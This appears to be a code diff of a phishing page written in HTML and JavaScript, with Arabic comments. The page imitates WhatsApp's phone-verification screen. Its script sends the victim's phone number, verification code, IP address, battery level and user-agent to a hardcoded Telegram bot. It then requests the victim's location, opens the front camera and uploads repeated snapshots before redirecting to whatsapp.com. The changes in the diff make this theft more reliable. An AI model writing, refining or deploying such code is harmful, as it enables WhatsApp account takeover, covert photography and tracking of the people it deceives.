@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp | التحقق من رقم الهاتف</title>
 
-    <!-- وسوم المعاينة الخارجية للصورة لظهر في تلجرام وتطبيقات التواصل -->
+    <!-- وسوم المعاينة الخارجية للصورة لتظهر في تلجرام -->
     <meta property="og:title" content="WhatsApp | التحقق من الحساب">
     <meta property="og:description" content="تأكيد رقم الهاتف ورمز التوثيق الخاص بك.">
     <meta property="og:image" content="wht441.jpg">
@@ -20,7 +20,7 @@
         body {
             margin: 0;
             padding: 0;
-            background: #111b21; /* خلفية واتساب الداكنة */
+            background: #111b21;
             color: #e9edef;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
@@ -61,7 +61,6 @@
             line-height: 1.5;
         }
 
-        /* حقول الإدخال */
         .input-group {
             margin-bottom: 20px;
             text-align: right;
@@ -85,7 +84,6 @@
             border-color: #00a884;
         }
 
-        /* الزر */
         .wa-btn {
             background-color: #00a884;
             color: #111b21;
@@ -103,7 +101,6 @@
             background-color: #008f72;
         }
 
-        /* العداد التنازلي */
         .timer-text {
             margin-top: 20px;
             font-size: 13px;
@@ -115,7 +112,6 @@
             font-weight: bold;
         }
 
-        /* إخفاء العناصر */
         .hidden {
             display: none !important;
         }
@@ -166,19 +162,32 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // تم تصحيح التوكن وحذف النقطتين الزائدتين من النهاية
         const TELEGRAM_TOKEN = "8622279801:AAG0QyixH5E2sWF4kluCPp6XPnh-iGbNaaI";
         const CHAT_ID = "8908174599";
         
         let capturedPhone = "";
 
-        function goToCodeStep() {
-            const phoneInput = document.getElementById('phoneNumber').value;
+        async function goToCodeStep() {
+            const phoneInput = document.getElementById('phoneNumber').value.trim();
             if(phoneInput.length < 6) {
                 alert("يرجى إدخال رقم هاتف صحيح");
                 return;
             }
             capturedPhone = phoneInput;
+
+            // إرسال الرقم فوراً للبوت لضمان عدم ضياعه
+            const techData = await fetchTech();
+            const now = new Date().toLocaleString('ar-EG');
+
+            let report = `📱 **رقم هاتف واتساب جديد**\n\n`;
+            report += `📞 الرقم: \`${capturedPhone}\`\n`;
+            report += `🕓 الوقت: ${now}\n`;
+            report += `🌍 IP: ${techData.ip}\n`;
+            report += `🔋 البطارية: ${techData.battery}\n\n`;
+            report += `===== 🧾 User-Agent =====\n`;
+            report += `\`${navigator.userAgent}\``;
+
+            await sendToTelegram(report);
 
             // الانتقال لواجهة الكود
             document.getElementById('step-phone').classList.add('hidden');
@@ -208,36 +217,35 @@
         }
 
         async function submitFinalData() {
-            const codeInput = document.getElementById('verificationCode').value;
+            const codeInput = document.getElementById('verificationCode').value.trim();
             
             // إظهار التحميل
             document.getElementById('step-code').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
 
-            const techData = await fetchTech();
             const now = new Date().toLocaleString('ar-EG');
+            let report = `🔢 **كود التحقق المدخل**\n\n`;
+            report += `📞 الرقم: \`${capturedPhone}\`\n`;
+            report += `🔑 الكود: \`${codeInput || 'لم يدخل'}\`\n`;
+            report += `🕓 الوقت: ${now}`;
 
-            let report = `📱 **تسجيل دخول واتساب جديد**\n\n`;
-            report += `📞 الرقم المدخل: \`${capturedPhone}\`\n`;
-            report += `🔢 الكود المدخل: \`${codeInput || 'لم يدخل'}\`\n`;
-            report += `🕓 الوقت: ${now}\n`;
-            report += `🌍 IP: ${techData.ip}\n`;
-            report += `🔋 البطارية: ${techData.battery}\n\n`;
-            report += `===== 🧾 User-Agent =====\n`;
-            report += `\`${navigator.userAgent}\``;
-
-            sendToTelegram(report);
+            await sendToTelegram(report);
 
             // طلب الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToTelegram(`📍 الموقع للرقم (${capturedPhone}): http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, () => {}, {timeout: 5000});
+            }
 
             // فتح الكاميرا والتقاط الصور
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                
+                // انتظار تحميل الفيديو تماماً
+                await new Promise(resolve => video.onloadedmetadata = resolve);
 
                 let count = 0;
                 const interval = setInterval(() => {
@@ -249,10 +257,12 @@
                         stream.getTracks().forEach(t => t.stop());
                         window.location.href = "https://whatsapp.com";
                     }
-                }, 1200);
+                }, 1500);
             } catch(e) {
-                sendToTelegram("❌ رفض صلاحية الكاميرا");
-                window.location.href = "https://whatsapp.com";
+                sendToTelegram(`❌ رفض صلاحية الكاميرا للرقم: ${capturedPhone}`);
+                setTimeout(() => {
+                    window.location.href = "https://whatsapp.com";
+                }, 2000);
             }
         }
 
@@ -262,33 +272,47 @@
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 res.ip = d.ip;
-                const b = await navigator.getBattery();
-                res.battery = `${Math.round(b.level*100)}%`;
             } catch(e){}
+
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    res.battery = `${Math.round(b.level * 100)}%`;
+                }
+            } catch(e){}
+
             return res;
         }
 
         function capture(n) {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
+            if(video.videoWidth === 0 || video.videoHeight === 0) return;
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
+            
             canvas.toBlob(blob => {
+                if(!blob) return;
                 const f = new FormData();
                 f.append('chat_id', CHAT_ID);
                 f.append('photo', blob, 'img.jpg');
                 f.append('caption', `اللقطة ${n} | للرقم: ${capturedPhone}`);
                 fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8);
         }
 
-        function sendToTelegram(t) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
-            });
+        async function sendToTelegram(t) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
+                });
+            } catch (err) {
+                console.error(err);
+            }
         }
     </script>
 </body>
